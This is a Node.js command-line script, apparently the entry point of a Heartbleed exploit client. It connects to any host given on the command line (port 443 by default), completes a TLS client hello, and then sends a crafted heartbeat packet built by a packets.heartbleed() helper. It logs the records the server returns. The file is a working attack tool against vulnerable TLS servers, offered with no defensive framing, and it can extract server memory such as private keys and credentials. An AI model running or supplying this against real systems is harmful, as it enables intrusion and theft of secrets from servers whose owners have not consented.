const net = require('net');
const PacketCutter = require('./src/cutter.js');
const packets = require('./src/packets.js');
const parse = require('./src/parser.js');
const C = require('./src/constants.js');

const program = require('commander')
    .version('0.1.0')
    .usage('<host> [options]')
    .option('-p, --port <port>', 'The port to connect to')
    .parse(process.argv);

const socket = net.connect(program.port || 443, program.args[0]);
const cutter = new PacketCutter(5, getLength);
socket.pipe(cutter);


socket.on('connect', function () {
    console.log('Connected!');
    console.log('Sending client hello...');
    send(packets.hello());
});

socket.on('data', function(chunk) {
    console.log('DATA', chunk);
});

cutter.on('data', function(buffer) {
    console.log('Received record (' + buffer.length + 'B):');
    const record = parse(buffer);
    console.log(record);

    if(record.type === C.messageType.HANDSHAKE){
        if (record.message.type === C.handshakeType.SERVER_DONE) {
            console.log('Server is done. Sending heartbeat...');
            send(packets.heartbleed());
        }
    }

    if (record.type === C.messageType.ALERT) {
        console.log(`Received alert from server: level=${
            C.alert.level[record.message.level]
        }, description=${
            C.alert.description[record.message.description]
        }`);
    }
});

function send(packet) {
    console.log(parse(packet));
    socket.write(packet, function() {
        console.log('Wrote packet');
    });
}

function getLength(header) {
    return parseInt(
        header
            .slice(3, 5)
            .toString('hex'),
        16
    ) + 5;
}